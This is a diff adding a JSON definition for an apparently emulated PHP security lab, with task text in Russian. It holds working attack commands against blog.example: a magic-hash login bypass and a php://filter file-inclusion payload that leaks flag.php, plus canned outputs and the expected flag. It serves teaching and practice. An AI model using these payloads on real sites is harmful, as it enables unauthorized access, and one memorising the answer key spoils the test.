@@ -1,0 +1,22 @@
+{
+  "id": "web-php-tricks",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{m4g1c_h4sh_byp4ss_2_adm1n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: PHP internals (magic hash + php://filter)\n\n`blog.example` — PHP-блог. Форма входа сравнивает `md5($pass) == $stored`\n(нестрогое `==`). Внутри — страница `?page=`, которая делает `include`.\n\n1. Обойди логин через magic hash:\n\n   curl -s -X POST https://blog.example/login -d 'user=admin&pass=240610708'\n\n2. В ответе — админ и путь к файлу с флагом. Прочитай его исходник через\n   обёртку `php://filter` (обычный include исполнил бы PHP, а не показал):\n\n   curl -s 'https://blog.example/?page=php://filter/convert.base64-encode/resource=/var/www/flag.php' | base64 -d > found.txt\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция blog.example)",
+      "cases": [
+        { "match": "240610708|pass\\[\\]", "example": "-s -X POST https://blog.example/login -d 'user=admin&pass=240610708'", "output": "{\"ok\":true,\"role\":\"admin\",\"panel\":\"?page=php://filter/convert.base64-encode/resource=/var/www/flag.php\"}\n" },
+        { "match": "php://filter", "example": "-s 'https://blog.example/?page=php://filter/convert.base64-encode/resource=/var/www/flag.php'", "output": "PD9waHAKLy8gZmxhZzogbnRve200ZzFjX2g0c2hfYnlwNHNzXzJfYWRtMW59Cg==\n" },
+        { "match": "blog\\.example/login", "example": "-s -X POST https://blog.example/login -d 'user=admin&pass=wrong'", "output": "{\"ok\":false,\"error\":\"bad credentials\"}\n" },
+        { "match": "\\?page=", "example": "-s 'https://blog.example/?page=about.php'", "output": "<html><body><h1>About blog.example</h1></body></html>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только логин и ?page= на blog.example.\n"
+    }
+  }
+}
